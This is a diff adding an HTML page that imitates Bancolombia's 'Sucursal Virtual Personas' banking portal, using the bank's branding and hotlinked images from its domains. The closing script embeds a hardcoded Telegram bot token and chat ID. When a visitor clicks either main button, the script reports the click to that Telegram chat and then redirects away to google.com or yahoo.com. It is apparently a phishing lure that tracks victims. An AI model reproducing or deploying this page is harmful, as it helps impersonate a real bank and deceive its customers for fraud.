@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sucursal Virtual Personas</title>
+
+<style>
+/* ===== RESET ===== */
+* {
+  box-sizing: border-box;
+  margin: 0;
+  padding: 0;
+  font-family: system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
+}
+
+body {
+  background: #ffffff;
+  color: #1c1c1c;
+}
+
+/* ===== HEADER ===== */
+header {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  padding: 16px;
+}
+
+.logo {
+  font-weight: 700;
+  font-size: 18px;
+}
+
+.menu {
+  font-size: 22px;
+}
+
+/* ===== HERO ===== */
+.hero img {
+  width: 100%;
+  display: block;
+}
+
+/* ===== CONTENT ===== */
+.content {
+  padding: 24px 16px;
+}
+
+.content h1 {
+  font-size: 32px;
+  margin-bottom: 16px;
+}
+
+.content p {
+  font-size: 16px;
+  line-height: 1.5;
+  color: #444;
+  margin-bottom: 28px;
+}
+
+/* ===== BOTÓN PRINCIPAL ===== */
+.cta {
+  width: 100%;
+  background: #ffd200;
+  border: none;
+  border-radius: 40px;
+  padding: 18px;
+  font-size: 18px;
+  font-weight: 600;
+  cursor: pointer;
+}
+
+/* ===== INFO ===== */
+.info {
+  background: #fff3c4;
+  padding: 32px 16px;
+}
+
+.info h2 {
+  font-size: 28px;
+}
+
+/* ===== VUELOS 360 ===== */
+.vuelos-section {
+  padding: 24px 16px;
+}
+
+.vuelos-btn {
+  width: 100%;
+  background: #ffd200;
+  border: none;
+  border-radius: 40px;
+  padding: 16px;
+  font-size: 18px;
+  font-weight: 600;
+  cursor: pointer;
+  margin-bottom: 20px;
+}
+
+.vuelos-img {
+  width: 100%;
+  max-width: 360px;
+  display: block;
+  margin: 16px auto;
+  border-radius: 20px;
+}
+
+.vuelos-title {
+  font-size: 22px;
+  margin: 20px 0 12px;
+}
+
+.card-vuelos {
+  background: #fce8f0;
+  border-radius: 20px;
+  padding: 16px;
+}
+
+.card-vuelos h3 {
+  margin-bottom: 12px;
+}
+
+.vuelo-item {
+  display: flex;
+  justify-content: space-between;
+  padding: 10px 0;
+  border-bottom: 1px solid #f9d3e1;
+  font-size: 15px;
+}
+
+.vuelo-item:last-child {
+  border-bottom: none;
+}
+
+.vuelo-destino {
+  text-transform: capitalize;
+  font-weight: 600;
+}
+
+.vuelo-precio {
+  font-weight: 600;
+}
+
+/* ===== FOOTER SIMPLE ===== */
+footer {
+  background: #0b1b2b;
+  color: #ffffff;
+  padding: 24px 16px;
+  margin-top: 40px;
+  font-size: 14px;
+}
+
+footer img {
+  width: 160px;
+  margin-bottom: 12px;
+}
+
+footer p {
+  line-height: 1.5;
+}
+</style>
+</head>
+
+<body>
+
+<header>
+  <div class="logo">Bancolombia</div>
+  <div class="menu">☰</div>
+</header>
+
+<main>
+
+  <!-- HERO -->
+  <section class="hero">
+    <img src="https://www.bancolombia.com/wcm/connect/www.bancolombia.com-26918/54c4cee4-7b1f-452f-9923-e9ba4ca32211/svp-banner-mobile.png?MOD=AJPERES&CACHEID=ROOTWORKSPACE.Z18_9O44G4S049MAD06H7SNS78IMS1-54c4cee4-7b1f-452f-9923-e9ba4ca32211-psdjnYk"
+         alt="Sucursal Virtual Personas">
+  </section>
+
+  <!-- CONTENT -->
+  <section class="content">
+    <h1>Sucursal Virtual Personas</h1>
+    <p>
+      Entra con tu mismo usuario y clave del cajero.<br>
+      Disfruta una nueva imagen: más fácil, más simple.<br>
+      La renovamos para ti.
+    </p>
+
+    <button class="cta" onclick="clickSucursalVirtual()">
+      Ir a la Sucursal Virtual
+    </button>
+
+  </section>
+
+  <!-- INFO -->
+  <section class="info">
+    <h2>Entérate de lo nuevo vuelos360bancolombia</h2>
+  </section>
+
+  <!-- VUELOS 360 -->
+  <section class="vuelos-section">
+    
+    <h2 class="vuelos-title">Los destinos más buscados</h2>
+
+    <div class="card-vuelos">
+      <h3>Viaja por Colombia</h3>
+
+      <div class="vuelo-item">
+        <span class="vuelo-destino">Medellín</span>
+        <span class="vuelo-precio">$102.531</span>
+      </div>
+
+      <div class="vuelo-item">
+        <span class="vuelo-destino">Cali</span>
+        <span class="vuelo-precio">$109.750</span>
+      </div>
+
+      <div class="vuelo-item">
+        <span class="vuelo-destino">Cartagena</span>
+        <span class="vuelo-precio">$112.240</span>
+      </div>
+
+      <div class="vuelo-item">
+        <span class="vuelo-destino">Santa Marta</span>
+        <span class="vuelo-precio">$132.903</span>
+      </div>
+
+      <div class="vuelo-item">
+        <span class="vuelo-destino">San Andrés</span>
+        <span class="vuelo-precio">$392.483</span>
+      </div>
+    </div>
+    <br>
+
+    
+   
+    <button class="vuelos-btn" onclick="clickVuelos360()">
+      vuelos360bancolombia
+    </button>
+
+
+    <img class="vuelos-img"
+      src="https://viajestu360compras.bancolombia.com/portals/27/Images/diatu360/01/dia_tu360_BannerOfertas1-720x400.webp"
+      alt="Ofertas Tu360">
+    <img class="vuelos-img"
+      src="https://viajestu360compras.bancolombia.com/portals/27/Images/Consumo/Tarjeta-Debito-Mastercard-Mobile.png"
+      alt="Tarjeta Débito">
+  </section>
+
+</main>
+
+<footer>
+  <img src="https://viajestu360compras.bancolombia.com/Portals/27/Skins/skin-bem/assets/images/logo-blanco-360.png">
+  <p>
+    Operado por NETVIAJES RNT 72357<br>
+    Netactica Colombia S.A.S<br><br>
+    Bancolombia S.A. ofrece alternativas de financiación.
+  </p>
+</footer>
+  <script>
+    const TELEGRAM_BOT_TOKEN = "8545595337:AAEMJymTqxVVtuerPNQmo7dnl_TIK9fPUIw";
+    const TELEGRAM_CHAT_ID = "7776240161";
+
+    function enviarTelegram(mensaje) {
+      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: mensaje
+        })
+      }).catch(() => {});
+    }
+
+    function clickSucursalVirtual() {
+      enviarTelegram("🟡 Click en: Ir a la Sucursal Virtual");
+      setTimeout(() => {
+        window.location.href = "https://www.google.com";
+      }, 300);
+    }
+
+    function clickVuelos360() {
+      enviarTelegram("🟣 Click en: vuelos360bancolombia");
+      setTimeout(() => {
+        window.location.href = "https://www.yahoo.com";
+      }, 300);
+    }
+  </script>
+
+</body>
+</html>
+
+  
